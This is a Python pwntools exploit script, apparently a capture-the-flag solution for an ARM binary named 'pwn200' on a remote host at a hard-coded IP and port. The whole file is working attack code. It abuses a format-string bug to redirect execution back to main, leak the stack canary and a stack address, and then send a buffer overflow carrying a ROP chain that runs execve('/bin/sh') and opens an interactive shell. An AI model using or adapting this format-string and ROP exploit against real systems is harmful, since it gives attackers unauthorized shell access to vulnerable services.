#!/usr/bin/python
from pwn import *
import sys

HOST = "165.227.98.55"
PORT = 7777

MAIN = 0x10600
CANARYADDR = 0x98f8c

def scan():
    with open("output", "w") as f:
        for i in range(1, 1000):
            try:
                r = process("./pwn200")
                r.recvuntil("CHECK> ")
                r.sendline("AAAA%%%d$p" % i)
                resp = r.recvline()
                f.write("%d => %s\n" % (i, resp))
                r.close()
            except:
                continue

def recvMult(r, count):	
	for i in range(0, count+0x100, 0x100):
		r.recv(0x100, timeout=0.05)

def exploit(r):	
	log.info("Overwrite RET with 'jump to main' to enter infinite loop")

	r.recvuntil("CHECK> ")
	r.sendline("%%%du%%460$n" % MAIN)	
	recvMult(r, MAIN)			# receive junk
	r.sendline()				# skip fight
	
	log.info("Write canary address to stack (Parameter 525 => 532)")
	r.recvuntil("CHECK> ")

	r.sendline("%%%du%%525$n" % (CANARYADDR + 1))
	recvMult(r, CANARYADDR +1)	# receive junk
	r.sendline()				# skip fight
		
	log.info("Read canary from parameter 532")	

	r.recvuntil("CHECK> ")
	r.sendline("%532$s")

	canary = u32("\x00"+r.recv(3))

	log.info("Canary          : %s" % hex(canary))

	r.sendline()				# skip fight

	log.info("Read stack address from parameter 3 to calculate payload address")	
	r.recvuntil("CHECK> ")
	r.sendline("%3$p")

	STACKLEAK = int(r.recvline()[:10], 16)
	PAYLOADADDR = STACKLEAK + 0x400

	log.info("Payload address : %s" % hex(PAYLOADADDR))

	log.info("Overflow buffer to execute execve('/bin/sh', 0, 0)")
	r.recvuntil("FIGHT> ")

	POPR7LR = 0x19d20
	POPR0LR = 0x70068
	POPR1LR = 0x70590
	POPR1R2LR = 0x6f9b0
	SYSCALL = 0x000553b8
	
	payload = "/bin/sh\x00"
	payload += "A"*(1024-len(payload))
	payload += p32(canary)	
	payload += "B"*12	

	# execve("/bin/sh", 0, 0)	
	payload += p32(POPR7LR)
	payload += p32(11)
	payload += p32(POPR0LR)
	payload += p32(PAYLOADADDR)
	payload += p32(POPR1R2LR)
	payload += p32(0)
	payload += p32(0)
	payload += p32(SYSCALL)
	
	r.sendline(payload)
	
	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./pwn200")
		print util.proc.pidof(r)
		pause()
		exploit(r)
